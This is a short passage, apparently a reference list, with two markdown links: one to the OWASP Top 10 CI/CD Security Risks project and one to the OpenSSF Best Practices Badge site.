- [OWASP Top 10 CI/CD Security Risks](https://owasp.org/www-project-top-10-ci-cd-security-risks/)
- [OpenSSF Best Practices Badge](https://www.bestpractices.dev/)
